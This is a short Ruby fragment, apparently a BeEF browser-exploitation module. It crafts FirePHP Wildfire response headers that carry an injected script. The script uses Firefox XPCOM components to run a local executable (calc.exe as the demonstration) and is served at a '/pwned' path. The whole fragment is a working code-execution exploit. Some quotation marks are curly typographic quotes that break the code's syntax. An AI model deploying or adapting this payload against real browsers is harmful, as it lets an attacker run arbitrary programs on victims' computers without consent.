
def pre_send
  exploit =  '{"RequestHeaders":{"1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","UR<script>'
  exploit+= 'var lFile=Components.classes[\"@mozilla.org/file/local;1\"].createInstance(Components.interfaces.nsILocalFile);'
  exploit+= 'lFile.initWithPath(\"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\calc.exe\");'
  exploit+= 'var process=Components.classes[\"@mozilla.org/process/util;1\"].createInstance(Components.interfaces.nsIProcess);'
  exploit+= 'process.init(lFile);'
  exploit+= 'process.run(true,[],0);void(0);'
  exploit+= '<\/SCRIPT>":"PWNT"}}'

  # mount payload at /pwned # code for bind_raw() is here: core/main/network_stack/assethandler.rb
  BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind_raw(
    '200',    # http status code
    {             # http headers to return
      'Content-Type'=>'text/html',
      'X-Wf-Protocol-1'=> ‘http://meta.wildfirehq.org/Protocol/JsonStream/0.2’,
      ‘X-Wf-1-Plugin-1’=> ‘http://meta.firephp.org/Wildfire/Plugin/FirePHP/Library-FirePHPCore/0.3’,
      ‘X-Wf-1-Structure-1’ => ‘http://meta.firephp.org/Wildfire/Structure/FirePHP/Dump/0.1’,
      ‘X-Wf-1-1-1-1’ => “#{exploit.length}|#{exploit}|\r\n"
    },
    'PWNT!',        # http body
    '/pwned',      # path URL path to mount the asset to
    -1                     # leave this as -1 for now
  )
end


# silly hack for command.js
def self.options
  configuration = BeEF::Core::Configuration.instance
  interface = "#{configuration.get("beef.http.host")}:#{configuration.get("beef.http.port")}"
  return [
      { 'name' => 'ip', 'description' => 'BeEF interface IP', 'ui_label' => 'IP', 'value' => '', 'width' => '200px' },
  ]
end

